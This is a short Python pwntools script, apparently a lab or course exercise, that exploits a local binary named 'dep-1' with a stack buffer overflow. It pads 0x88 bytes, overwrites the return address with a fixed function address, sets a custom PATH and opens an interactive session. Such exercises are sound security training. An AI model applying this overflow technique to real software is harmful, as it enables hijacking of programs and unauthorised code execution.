#!/usr/bin/env python

from pwn import *
import os

env= {
        "PATH": "/home/users/didnera/week4/0-dep-1",
        }

# create process and run the program
p = process("./dep-1",env=env)

context.terminal = ["tmux", "splitw", "-h"]
#gdb.attach(p)


buff = ""
some_function_addr = p32(0x08048553)
#bin_bash = p32()

buff += "A" * 0x88 +"BBBB"+ some_function_addr




p.sendline(buff)

p.interactive()